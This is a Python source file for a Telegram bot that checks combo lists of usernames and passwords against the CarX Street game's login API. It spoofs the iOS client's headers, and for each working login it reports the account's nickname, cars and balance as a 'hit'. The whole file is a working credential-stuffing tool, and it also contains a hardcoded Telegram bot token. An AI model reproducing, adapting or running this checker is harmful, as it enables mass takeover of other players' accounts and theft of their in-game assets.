import telebot,time,requests
from telebot import types
#——————————————————————#
session = requests.session()
is_checking = False
#——————————————————————#
bot = telebot.TeleBot('6525658406:AAGIH64g6sM0XzCepGPSYvFmVskLanf_YNQ')
print("BoT Started")
#——————————————————————#
@bot.message_handler(commands=['start'])
def start(message):
	global is_checking
	is_checking = True
	chat_id = message.chat.id
	bot.send_message(message.chat.id, "Welcome! Send me the file.")
#——————————————————————#
	@bot.message_handler(content_types=['document'])
	def handle_document(message):
		global is_checking
		file_info = bot.get_file(message.document.file_id)
		downloaded_file = bot.download_file(file_info.file_path)
		file_content = downloaded_file.decode('utf-8')
		lines = file_content.strip().split('\n')
		if not is_checking:return
#——————————————————————#
		msg = bot.send_message(chat_id=chat_id,text="The Checking Started, Wait ⌛")
#——————————————————————#
		work = 0
		fucked = 0
#——————————————————————#
		for line in lines:
			if not is_checking:return
			line = line.strip()
			try:
				user, pas = line.split(':')
				email = f"{user}:{pas}"
				email1 = f"{user} • {pas}"	#——————————————————————#
				url = "https://carx-id-prod.carx-online.com/api/auth/login"
				data = f"username={user}&password={pas}&project=STREET"
				headers = {
				'Host': 'carx-id-prod.carx-online.com',
				'Content-Type': 'application/x-www-form-urlencoded',
				'User-Agent': 'CarXStreet/717 CFNetwork/1404.0.5 Darwin/22.3.0',
				'Connection': 'keep-alive',
				'Accept': '*/*',
				'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
				'Accept-Encoding': 'gzip, deflate, br',
				'X-Unity-Version': '2021.3.19f1'
}
				response = session.post(url,headers=headers,data=data)
#—————————Request———————––#
				if "token" in response.text:
					token = response.json()["d"]["token"]
#——————————————————————#
					url2 = "https://street-prod.carx-online.com/str/v1/client/profiles/nickname"
					headers2 = {
						'User-Agent': 'CarXStreet/717 CFNetwork/1404.0.5 Darwin/22.3.0',
						'Pragma': 'no-cache',
						'Accept': '*/*',
						'Host': 'street-prod.carx-online.com',
						'Content-Type': 'application/json; charset=UTF-8',
						'Accept-Encoding': 'gzip, deflate, br',
						'Connection': 'keep-alive',
						'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
						'Authorization': f'Bearer {token}',
						'Content-Length': '0',
						'X-Unity-Version': '2021.3.19f1'
				}
					response2 = session.post(url2,headers=headers2)
					nickname = response2.json()["d"]["nickname"]
#——————————————————————#
					url3 = "https://street-prod.carx-online.com/str/v1/client/profiles"
					headers3 = {
	"Content-Type": "application/json; charset=UTF-8",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "CarXStreet/717 CFNetwork/1404.0.5 Darwin/22.3.0",
    "Connection": "keep-alive",
    "Accept": "*/*",
    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    "Authorization": f"Bearer {token}",
    "X-Unity-Version": "2021.3.19f1"}
					response3 = session.get(url3,headers=headers3)
#——————————————————————#
					cars = response3.json()["d"]["data"]["car_models"]["keys"]
					balance = response3.json()["d"]["data"]["resources"]["soft"]["amount"]
					cars = '\n  '.join(cars)
#——————————————————————#
					bot.send_message(chat_id,text=f"New Hit: {email}\n\nNickname: {nickname}\n\nCars:\n  {cars}\n\nBalance: {balance}")
					work += 1	#——————————————————————#
				else:fucked += 1
#——————————————————————#
				reply_markup = create_reply_markup(email1,work,fucked,len(lines))
				bot.edit_message_text(
	chat_id=chat_id,
	message_id=msg.message_id,
	text="Checking in progress...",
	reply_markup=reply_markup)
#——————————————————————#
			except ValueError:print("fuck")
			except telebot.apihelper.ApiTelegramException as e:
				retry_after_seconds = (e.result_json)
				print(retry_after_seconds)
				timetowait = (retry_after_seconds['parameters']['retry_after'])
				time.sleep(timetowait)
		is_checking = False
		bot.send_message(chat_id,"The check has completed successfully")
		return
	return
#——————————————————————#
def create_reply_markup(line, work, fucked, All):
    
    markup = types.InlineKeyboardMarkup()
    
    email_button = types.InlineKeyboardButton(text=f"⌜ • {line} • ⌝", callback_data='none')
    work_button = types.InlineKeyboardButton(text=f"⌯ Working: {work} ⌯", callback_data='none')
    dead_button = types.InlineKeyboardButton(text=f"⌞ • Fucked: {fucked}", callback_data='none')
    all_button = types.InlineKeyboardButton(text=f"All: {All} • ⌟", callback_data='none')
    team_button = types.InlineKeyboardButton(text="Dev Team", url='https://t.me/telemex')
    dev_button = types.InlineKeyboardButton(text="Dev", url='https://t.me/E_2_7')
    
    stop_button = telebot.types.InlineKeyboardButton(text="STOP", callback_data="stop")
    
    markup.add(email_button)
    markup.add(work_button)
    markup.add(dead_button,all_button)
    markup.add(team_button,dev_button)
    markup.add(stop_button)
    return markup
@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
		global is_checking
		if call.data == "stop":
			is_checking = False
			bot.answer_callback_query(call.id, text="Checking stopped.")
#——————————————————————#
bot.infinity_polling()
